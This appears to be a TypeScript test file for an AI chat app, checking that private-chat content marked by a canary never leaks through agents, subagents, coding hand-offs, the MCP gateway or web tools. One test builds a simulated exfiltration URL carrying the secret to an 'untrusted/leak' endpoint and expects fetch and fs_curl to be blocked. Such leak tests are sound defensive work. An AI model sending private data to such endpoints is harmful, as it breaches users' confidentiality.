/**
 * Egress canary rows for private chats (PR 4): agent runs, subagents, coding
 * proposals and hand-offs, the MCP gateway, and the egress tools once a turn
 * is tainted. See canary.spec.ts for how the harness works.
 */
import { beforeEach, describe, expect, it } from 'vitest';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';

process.env.DATABASE_PATH = ':memory:';
process.env.APP_SECRET = 'test-secret-test-secret';

const { getDb } = await import('../db/index.js');
const { createConversation } = await import('../db/repo/conversations.js');
const { createMessage } = await import('../db/repo/messages.js');
const { createAgent } = await import('../db/repo/agents.js');
const { createAgentRun, finishAgentRun } = await import('../db/repo/agent-runs.js');
const { createApiKey } = await import('../db/repo/api-keys.js');
const { listMcpServers } = await import('../db/repo/mcp-servers.js');
const { runSubagent } = await import('../agents/subagents.js');
const { buildTools } = await import('../tools/registry.js');
const { createAgentsServer, PRIVATE_RUN_NOTE } = await import('../mcp/servers/agents.js');
const { InMemoryTransport } = await import('@modelcontextprotocol/sdk/inMemory.js');
const { createMCPClient } = await import('@ai-sdk/mcp');
const { assertToolAllowed, BLOCKED_PREFIX } = await import('./guard.js');
const { isConversationPrivate } = await import('./policy.js');
const { TurnPrivacy } = await import('./taint.js');
const { CANARY } = await import('./fixtures.js');
const { useCanaryServer } = await import('./canary-harness.js');
const gatewayRoute = await import('../../../routes/api/mcp/+server.js');
const codingTasksRoute = await import('../../../routes/api/coding/tasks/+server.js');
const handoffRoute =
	await import('../../../routes/api/conversations/[id]/handoff-draft/+server.js');

const canary = useCanaryServer();
const { recorded, trustedSaw, untrustedSaw, expectNoLeak, privateChat } = canary;
let fx: typeof canary.fx;
beforeEach(() => {
	fx = canary.fx;
});

function enableServers(...names: string[]) {
	const db = getDb();
	for (const name of names) {
		db.prepare('UPDATE mcp_servers SET enabled = 1 WHERE name = ? AND builtin = 1').run(name);
	}
}

function serverRow(name: string) {
	const row = listMcpServers(getDb()).find((r) => r.name === name && r.builtin === 1);
	if (!row) throw new Error(`no builtin ${name}`);
	return row;
}

/** A public chat on `model` and its turn's privacy. */
function publicTurn(
	model: { providerId: string; modelId: string },
	trust: 'trusted' | 'untrusted'
) {
	const db = getDb();
	const c = createConversation(db, fx.userId, { title: 'public', ...model, private: false });
	return {
		conversation: c,
		privacy: new TurnPrivacy(db, fx.userId, { conversationId: c.id, trust })
	};
}

/** A private agent's finished run whose reply holds the canary. */
function privateAgentRun() {
	const db = getDb();
	const agent = createAgent(db, fx.userId, {
		name: 'secret agent',
		systemPrompt: 'x',
		triggerType: 'manual',
		private: true,
		...fx.trusted
	});
	const conversation = createConversation(db, fx.userId, {
		kind: 'agent-run',
		agentId: agent.id,
		private: true
	});
	createMessage(db, {
		conversationId: conversation.id,
		role: 'assistant',
		parts: [{ type: 'text', text: `Found: ${CANARY}` }]
	});
	const run = createAgentRun(db, {
		agentId: agent.id,
		userId: fx.userId,
		trigger: 'manual',
		conversationId: conversation.id
	});
	finishAgentRun(db, run.id, 'success');
	return run.id;
}

async function callAgentsTool(
	ctx: Parameters<typeof createAgentsServer>[0],
	name: string,
	args: Record<string, unknown>
): Promise<string> {
	const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
	const server = createAgentsServer(ctx);
	await server.connect(serverTransport);
	const client = await createMCPClient({ transport: clientTransport, maxRetries: 0 });
	try {
		const tool = (await client.tools())[name] as unknown as {
			execute: (input: unknown, opts: unknown) => Promise<{ content?: { text?: string }[] }>;
		};
		const res = await tool.execute(args, { toolCallId: 't1', messages: [] });
		return res.content?.[0]?.text ?? '';
	} finally {
		await client.close();
		await server.close();
	}
}

/** What the AI SDK passes a tool's execute; only toolCallId matters here. */
const EXEC_OPTIONS = { toolCallId: 't1', messages: [] } as never;

const subagentTurns = () => trustedSaw().filter((r) => r.body.includes('You are a subagent'));

describe('egress canary: agent runs and subagents (PR 4)', () => {
	it("agent result: a private run's result never reaches an untrusted caller", async () => {
		const runId = privateAgentRun();
		const { conversation, privacy } = publicTurn(fx.untrusted, 'untrusted');
		const text = await callAgentsTool(
			{
				userId: fx.userId,
				role: 'user',
				workspaceDir: null,
				documentsDir: '',
				conversationId: conversation.id,
				privacy,
				trust: 'untrusted'
			},
			'get_agent_run',
			{ runId }
		);
		expect(text).not.toContain(CANARY);
		expect(JSON.parse(text).note).toBe(PRIVATE_RUN_NOTE);
		expect(isConversationPrivate(getDb(), conversation.id)).toBe(false);
		expectNoLeak();
	});

	it('subagent: a private parent starts a private, tainted subagent', async () => {
		enableServers('webfetch');
		const parent = privateChat(fx.trusted);
		const result = await runSubagent({
			userId: fx.userId,
			parentConversationId: parent.id,
			description: 'look',
			prompt: `Summarise ${CANARY}`
		});
		expect(isConversationPrivate(getDb(), result.conversationId)).toBe(true);
		const turns = subagentTurns();
		expect(turns.length).toBeGreaterThan(0);
		// Tainted from the start: the egress tools aren't even offered.
		for (const t of turns) expect(t.body).not.toMatch(/"name":"fetch"/);
		expectNoLeak();
	});

	it("subagent: run_subagent in a tainted parent can't reach fetch", async () => {
		enableServers('webfetch');
		// Control: a public parent's subagent is offered fetch.
		const open = publicTurn(fx.trusted, 'trusted');
		await runSubagent({
			userId: fx.userId,
			parentConversationId: open.conversation.id,
			description: 'look',
			prompt: 'Look something up',
			parentPrivacy: open.privacy
		});
		expect(subagentTurns().some((t) => /"name":"fetch"/.test(t.body))).toBe(true);
		recorded.length = 0;

		// The same parent, tainted mid-turn (it read private data): fetch is gone.
		const tainted = publicTurn(fx.trusted, 'trusted');
		tainted.privacy.markTainted('test: read a private chat');
		await runSubagent({
			userId: fx.userId,
			parentConversationId: tainted.conversation.id,
			description: 'look',
			prompt: `Look up ${CANARY}`,
			parentPrivacy: tainted.privacy
		});
		const turns = subagentTurns();
		expect(turns.length).toBeGreaterThan(0);
		for (const t of turns) expect(t.body).not.toMatch(/"name":"fetch"/);
		expectNoLeak();
	});

	it("subagent: a private subagent's report taints a public parent on a trusted model", async () => {
		const db = getDb();
		const parent = publicTurn(fx.trusted, 'trusted');
		const pending = runSubagent({
			userId: fx.userId,
			parentConversationId: parent.conversation.id,
			description: 'look',
			prompt: 'Look something up',
			parentPrivacy: parent.privacy
		});
		// The subagent's chat exists once runSubagent returns its promise: it turns
		// private as if it had read private data.
		const sub = db
			.prepare('SELECT id FROM conversations WHERE subagent_of = ?')
			.get(parent.conversation.id) as { id: string };
		db.prepare('UPDATE conversations SET private = 1 WHERE id = ?').run(sub.id);
		const result = await pending;
		expect(result.status).toBe('completed');
		expect(parent.privacy.tainted).toBe(true);
		expect(isConversationPrivate(db, parent.conversation.id)).toBe(true);
		expectNoLeak();
	});
});

describe('egress canary: coding (PR 4)', () => {
	it('proposal: propose_coding_task is refused from a tainted context', async () => {
		enableServers('coding');
		const { conversation, privacy } = publicTurn(fx.trusted, 'trusted');
		const built = await buildTools({
			userId: fx.userId,
			memoryEnabled: false,
			conversationId: conversation.id,
			privacy,
			trust: 'trusted'
		});
		try {
			const tool = built.tools.propose_coding_task;
			expect(tool).toBeDefined();
			privacy.markTainted('test: read a private chat');
			await expect(tool.execute!({ prompt: CANARY }, EXEC_OPTIONS)).rejects.toThrow(BLOCKED_PREFIX);
		} finally {
			await built.close();
		}
		expect(recorded).toEqual([]);
	});

	it("proposal: a private chat's proposal can't start a coding task", async () => {
		const chat = privateChat(fx.trusted);
		const request = new Request('http://localhost/api/coding/tasks', {
			method: 'POST',
			body: JSON.stringify({
				environmentId: 'env',
				projectId: 'proj',
				providerInstanceId: 'codex',
				model: 'm',
				autonomy: 'full-access',
				workspaceMode: 'local',
				prompt: CANARY,
				proposal: { conversationId: chat.id, toolCallId: 't1' }
			})
		});
		await expect(
			codingTasksRoute.POST({ locals: { user: { id: fx.userId } }, request } as never)
		).rejects.toMatchObject({ status: 409 });
		expect(recorded).toEqual([]);
	});

	it('hand-off: a private chat is refused before any model call', async () => {
		const chat = privateChat(fx.trusted);
		await expect(
			handoffRoute.POST({
				locals: { user: { id: fx.userId } },
				params: { id: chat.id }
			} as never)
		).rejects.toMatchObject({
			status: 409,
			body: { message: "Private chats can't be handed off to a coding agent" }
		});
		expect(recorded).toEqual([]);
	});
});

describe('egress canary: MCP gateway (PR 4)', () => {
	async function connect(rawKey: string): Promise<Client> {
		const routeFetch = async (input: string | URL | Request, init?: RequestInit) => {
			const request = new Request(input, init);
			return (request.method === 'POST' ? gatewayRoute.POST : gatewayRoute.GET)({
				request,
				url: new URL(request.url)
			} as never);
		};
		const client = new Client({ name: 'test', version: '1.0.0' });
		await client.connect(
			new StreamableHTTPClientTransport(new URL('http://localhost/api/mcp'), {
				fetch: routeFetch,
				requestInit: { headers: { authorization: `Bearer ${rawKey}` } }
			})
		);
		return client;
	}

	it('gateway: read_chat and search_chats never return a private chat', async () => {
		enableServers('chat-search');
		const db = getDb();
		const chat = privateChat(fx.trusted);
		const { rawKey } = await createApiKey(db, {
			userId: fx.userId,
			label: 'external',
			scopes: ['mcp:use'],
			mcpAccess: [{ serverId: serverRow('chat-search').id, tools: null }]
		});
		const client = await connect(rawKey);
		try {
			const search = await client.callTool({
				name: 'search_chats',
				arguments: { query: CANARY }
			});
			const searchText = JSON.stringify(search.content);
			expect(searchText).not.toContain(chat.id);
			expect(searchText).not.toContain(CANARY);
			expect(searchText).toContain('1 private result hidden');

			const listing = await client.callTool({ name: 'search_chats', arguments: { since: '0' } });
			expect(JSON.stringify(listing.content)).not.toContain(chat.id);

			const read = await client.callTool({
				name: 'read_chat',
				arguments: { conversationId: chat.id }
			});
			expect(read.isError).toBe(true);
			expect(JSON.stringify(read.content)).toContain('conversation not found');
			expect(JSON.stringify(read.content)).not.toContain(CANARY);
		} finally {
			await client.close();
		}
		expect(isConversationPrivate(db, chat.id)).toBe(true);
		expectNoLeak();
	});
});

describe('egress canary: egress tools once tainted (PR 4)', () => {
	it('fetch, fs_curl, get_weather and web_search are refused once the turn is tainted', async () => {
		enableServers('webfetch', 'fs', 'weather', 'websearch');
		const { conversation, privacy } = publicTurn(fx.trusted, 'trusted');
		const built = await buildTools({
			userId: fx.userId,
			memoryEnabled: false,
			conversationId: conversation.id,
			privacy,
			trust: 'trusted'
		});
		const leakUrl = `${canary.base}/untrusted/leak?q=${CANARY}`;
		const calls: Record<string, unknown> = {
			fetch: { url: leakUrl },
			fs_curl: { scope: 'documents', url: leakUrl, path: 'leak.txt' },
			get_weather: { location: CANARY }
		};
		try {
			for (const name of Object.keys(calls)) expect(built.tools[name]).toBeDefined();
			// The turn reads private data mid-turn; the catalog it already has stays,
			// but every call is checked when it runs.
			privacy.markTainted('test: read a private chat');
			for (const [name, input] of Object.entries(calls)) {
				await expect(built.tools[name].execute!(input, EXEC_OPTIONS)).rejects.toThrow(
					BLOCKED_PREFIX
				);
			}
			// web_search is only offered with a search provider set up; the guard
			// refuses it regardless.
			expect(() =>
				assertToolAllowed(getDb(), serverRow('websearch'), 'web_search', { query: CANARY }, privacy)
			).toThrow(BLOCKED_PREFIX);
		} finally {
			await built.close();
		}
		expect(untrustedSaw()).toEqual([]);
		expect(recorded).toEqual([]);
	});
});
